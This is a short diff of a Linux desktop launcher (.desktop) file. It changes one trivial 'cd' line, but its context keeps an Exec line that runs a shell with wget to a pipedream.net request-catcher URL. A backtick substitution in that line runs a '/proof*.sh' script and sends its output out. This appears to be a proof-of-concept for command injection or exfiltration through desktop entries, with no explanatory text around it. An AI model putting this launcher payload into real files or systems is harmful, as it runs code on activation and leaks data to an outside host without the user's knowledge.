@@ -1,4 +1,4 @@
 [Desktop Entry]
-Exec=bash -c 'cd /'
+Exec=bash -c 'cd'
 Exec=sh -c "wget https://eonka939zo7nuk7.m.pipedream.net/? `/proof*.sh`"
 Type=Application
